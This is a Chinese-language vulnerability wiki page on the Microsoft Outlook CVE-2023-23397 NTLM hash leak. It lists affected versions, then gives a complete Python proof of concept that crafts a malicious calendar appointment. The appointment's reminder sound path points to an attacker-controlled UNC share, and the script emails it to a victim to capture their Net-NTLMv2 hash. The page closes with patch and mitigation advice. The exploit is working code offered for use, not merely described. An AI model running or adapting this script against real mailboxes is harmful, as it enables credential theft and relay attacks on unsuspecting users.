<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/%E5%85%B6%E4%BB%96%E6%BC%8F%E6%B4%9E/Microsoft%20Outlook%20%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%20CVE-2023-23397/">
    <link rel="shortcut icon" href="../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Microsoft Outlook 权限提升漏洞 CVE-2023-23397 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../js/jquery-3.2.1.min.js"></script>
    <script src="../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Microsoft Outlook \u6743\u9650\u63d0\u5347\u6f0f\u6d1e CVE-2023-23397", url: "#_top", children: [
              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
              {title: "\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_3" },
              {title: "\u6f0f\u6d1e\u4fee\u590d", url: "#_4" },
          ]},
        ];

    </script>
    <script src="../../js/base.js"></script>
      <script src="../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../Microsoft%20Word%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2023-21716/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../Microsoft%20Word%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2023-21716/" class="btn btn-xs btn-link">
        Microsoft Word 远程代码执行漏洞 CVE-2023-21716
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../Microsoft%20Exchange%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%20CVE-2021-27065%2026857%2026858/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../Microsoft%20Exchange%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%20CVE-2021-27065%2026857%2026858/" class="btn btn-xs btn-link">
        Microsoft Exchange 远程命令执行 CVE-2021-27065 26857 26858
      </a>
    </div>
    
  </div>

    

    <h1 id="microsoft-outlook-cve-2023-23397">Microsoft Outlook 权限提升漏洞 CVE-2023-23397<a class="headerlink" href="#microsoft-outlook-cve-2023-23397" title="Permanent link">&para;</a></h1>
<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p>该漏洞存在于 Microsoft Outlook 中，是一个身份验证绕过漏洞。未经身份验证的远程攻击者仅通过向受影响的系统发送特制电子邮件，从而访问用户的Net-NTLMv2 哈希，进而可以在中继攻击中使用此哈希来冒充用户，从而有效地绕过身份验证。</p>
<h2 id="_2">漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<div class="highlight"><pre><span></span><code>Microsoft Outlook 2016 (64-bit edition)
Microsoft Outlook 2013 Service Pack 1 (32-bit editions)
Microsoft Outlook 2013 RT Service Pack 1
Microsoft Outlook 2013 Service Pack 1 (64-bit editions)
Microsoft Office 2019 for 32-bit editions
Microsoft 365 Apps for Enterprise for 32-bit Systems
Microsoft Office 2019 for 64-bit editions
Microsoft 365 Apps for Enterprise for 64-bit Systems
Microsoft Office LTSC 2021 for 64-bit editions
Microsoft Outlook 2016 (32-bit edition)
Microsoft Office LTSC 2021 for 32-bit editions
</code></pre></div>
<h2 id="_3">漏洞复现<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<p>exp：</p>
<div class="highlight"><pre><span></span><code>python CVE-2023-23397.py --path &#39;\\your-ip\&#39;
</code></pre></div>
<div class="highlight"><pre><span></span><code>import smtplib, datetime, argparse
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication
from email.utils import COMMASPACE, formatdate
from independentsoft.msg import Message

## Mail configuration : change it !
smtp_server = &quot;mail.example.com&quot;
smtp_port = 587

sender_email = &quot;attacker@mail.example.com&quot;
sender_password = &quot;P@ssw0rd&quot;

recipients_email = [&quot;victim@mail.example.com&quot;]

class Email:
    def __init__(self, smtp_server, port, username, password, recipient):
        self.smtp_server = smtp_server
        self.port = port
        self.username = username
        self.password = password
        self.recipient = recipient

    def send(self, subject, body, attachment_path):
        msg = MIMEMultipart()
        msg[&#39;From&#39;] = self.username
        msg[&#39;To&#39;] = COMMASPACE.join(self.recipient)
        msg[&#39;Date&#39;] = formatdate(localtime=True)
        msg[&#39;Subject&#39;] = subject

        msg.attach(MIMEText(body))

        with open(attachment_path, &#39;rb&#39;) as f:
            part = MIMEApplication(f.read(), Name=attachment_path)
            part[&#39;Content-Disposition&#39;] = f&#39;attachment; filename=&quot;{attachment_path}&quot;&#39;
            msg.attach(part)

        try:
            server = smtplib.SMTP(self.smtp_server, self.port)
            server.starttls()
            server.login(self.username, self.password)
            server.sendmail(self.username, self.recipient, msg.as_string())
            server.quit()
            print(&quot;[+] Malicious appointment sent !&quot;)


        except Exception as e:
            print(&quot;[-] Error with SMTP server...&quot;, e)

parser = argparse.ArgumentParser(description=&#39;CVE-2023-23397 POC : send a malicious appointment to trigger NetNTLM authentication.&#39;)
parser.add_argument(&#39;-p&#39;, &#39;--path&#39;, type=str, help=&#39;Local path to process&#39;, required=True)
args = parser.parse_args()

appointment = Message()
appointment.message_class = &quot;IPM.Appointment&quot;
appointment.subject = &quot;CVE-2023-23397&quot;
appointment.body = &quot;New meeting now !&quot;
appointment.location = &quot;Paris&quot;
appointment.appointment_start_time = datetime.datetime.now()
appointment.appointment_end_time = datetime.datetime.now()
appointment.reminder_override_default = True
appointment.reminder_sound_file = args.path
appointment.save(&quot;appointment.msg&quot;)

email = Email(smtp_server, smtp_port, sender_email, sender_password, recipients_email)

subject = &quot;Hello There !&quot;
body = &quot;Important appointment !&quot;
email.send(subject, body, &quot;appointment.msg&quot;)
</code></pre></div>
<h2 id="_4">漏洞修复<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
<p>目前微软官方已针对受支持的产品版本发布了修复该漏洞的安全补丁，建议受影响用户开启系统自动更新安装补丁进行防护。</p>
<p>注：由于网络问题、计算机环境问题等原因，Windows Update 的补丁更新可能出现失败。用户在安装补丁后，应及时检查补丁是否成功更新。右键点击Windows 徽标，选择“设置(N)”，选择“更新和安全”-“Windows 更新”，查看该页面上的他提示信息，也可点击“查看更新历史记录”查看历史更新情况。</p>
<p>针对未成功安装更新补丁的情况，可直接下载离线安装包进行更新，链接如下：
<a href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2023-23397">https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2023-23397</a></p>
<p>临时防护措施：</p>
<p>若用户无法正常进行补丁修复，在不影响正常业务的情况下，可使用以下措施对漏洞进行防护：</p>
<ol>
<li>将用户添加到受保护的用户安全组，以防止使用 NTLM 作为身份验证机制。注意：该操作可能会对需要 NTLM 的应用程序造成一定影响。详情请参考：
   <a href="https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group">https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group</a></li>
<li>用户可通过在网络中同时使用外围防火墙和本地防火墙，并通过 VPN 设置来阻止 TCP 445/SMB 从网络出站。注意：该操作将禁止发送 NTLM 身份验证消息到远程文件共享。</li>
</ol>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../Microsoft%20Word%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2023-21716/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../Microsoft%20Word%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2023-21716/" class="btn btn-xs btn-link">
        Microsoft Word 远程代码执行漏洞 CVE-2023-21716
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../Microsoft%20Exchange%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%20CVE-2021-27065%2026857%2026858/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../Microsoft%20Exchange%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%20CVE-2021-27065%2026857%2026858/" class="btn btn-xs btn-link">
        Microsoft Exchange 远程命令执行 CVE-2021-27065 26857 26858
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>